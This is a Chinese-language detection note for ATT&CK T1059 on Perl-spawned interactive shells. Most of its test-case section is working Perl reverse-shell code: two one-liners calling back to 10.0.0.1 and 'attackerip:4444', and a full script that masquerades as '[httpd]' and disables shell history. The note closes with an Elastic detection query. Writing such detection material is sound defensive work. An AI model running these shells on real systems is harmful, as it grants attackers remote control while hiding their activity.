# T1059-linux-通过Perl生成的交互式shell

## 来自ATT&CK的描述

攻击者可能滥用命令和脚本解释器来执行命令、脚本或二进制文件。这些接口和语言提供了与计算机系统交互的方式，并且是许多不同平台的共同特征。大多数系统都带有一些内置的命令行界面和脚本功能，例如:macOS和Linux发行版包括一些Unix Shell，而Windows安装包括Windows Command Shell和PowerShell。

还有跨平台解释器，例如Python ，以及通常与客户端应用程序相关的解释器，例如JavaScript和Visual Basic。 

攻击者可能会滥用Unix shell来执行各种命令或有效载荷。可以通过命令和控制通道或在横向移动期间（例如使用SSH）访问交互式外壳。攻击者还可以利用Shell脚本在受害者上传递或执行多个命令，或者作为用于持久性的有效载荷的一部分。

## 测试案例

通过Perl生成终端(tty)。攻击者可以将简单的反向shell升级为完全获得对主机的初始访问权限后的交互式tty。

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#用这条命令，唯一的不同是提示符变成了sh-4.1#，实现原理和前面的bash差不多
```

依赖于/bin/sh的shell：这条语句比上面的更为简短，而且确实不需要依赖/bin/sh

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

完整版的perl反弹shell脚本

```perl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '127.0.0.1';
my $port = 1234;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
```

## 检测日志

无

## 测试复现

无

## 测试留痕

无

## 检测规则/思路

### elastic

```yml
query = '''
event.category:process and event.type:(start or process_started) and process.name:perl and
  process.args:("exec \"/bin/sh\";" or "exec \"/bin/dash\";" or "exec \"/bin/bash\";")
'''
```

### 建议

对数据源要求较高，需要正确配置相关策略记录相关命令参数，才能够使用该规则。

## 参考推荐

MITRE-ATT&CK-T1059

<https://attack.mitre.org/techniques/T1059>

Linux下反弹shell的种种方式

<https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html>

Interactive Terminal Spawned via Perl

<https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_perl_tty_shell.toml>